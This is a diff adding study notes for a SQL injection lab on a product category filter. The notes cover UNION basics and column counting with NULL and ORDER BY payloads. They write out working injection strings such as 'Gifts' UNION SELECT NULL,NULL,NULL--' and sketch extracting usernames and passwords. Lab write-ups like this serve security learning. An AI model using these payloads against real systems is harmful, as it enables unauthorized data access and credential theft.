@@ -184,3 +184,77 @@ you get a "400" response.
 ```
 
 > Go to: Python script = sqli-lab-02.py
+
+# Lab 3. SQLi UNION attack
+
+Determining the number of columns returned by the query.
+
+SQLi: Product category filter.
+
+**End goal**: Determine the number of columns that are being
+returned by the query, by performing an SQLi UNION attack
+that returns an additional row containing NULL values.
+
+```sql
+-- UNION refresher:
+SELECT col1, col2, col3
+FROM tbl1
+    UNION 
+-- 1. Same number and order of columns
+-- 2. The data types must be compatible
+SELECT col1, col2, col3
+FROM tbl2 
+;
+```
+
+In future labs, we will be able to have a query like this:
+```sql
+SELECT p1, p2
+FROM tbl_products
+-- Malicious payload:
+    UNION
+SELECT usernames, passwords
+FROM tbl_users
+;
+```
+
+### SQL Attack Analysis:
+
+SQLi attack with `UNION` clause:
+
+```sql
+-- If you want to find out how many columns a table has:
+SELECT *
+FROM tbl_products
+    UNION
+SELECT NULL, NULL, NULL -- Until you find the correct number
+FROM DUAL
+;
+```
+
+SQLi attack with `ORDER BY` clause:
+
+```sql
+SELECT a,b FROM tbl PRODUCTS
+ORDER BY 4 -- Try 1, 2, 3, ... until you get an error
+;
+```
+
+Payload 1: `?category='` -> 500 Internal Server Error
+
+Payload 2: `?category='--` -> 200
+
+Payload 3: `?category=Gifts' UNION SELECT NULL --`
+
+> Burp Suite -> Intercept -> Send to Repeater.
+
+| REQUEST | RESPONSE |  
+(Raw)
+
+`GET /filter?category=Gifts'+UNION+select+NULL,+NULL,+NULL--`
+
+Number of columns = 3
+
+Payload 4 (second strategy):  
+
+`GET /filter?category=Gifts'ORDER BY 4--`
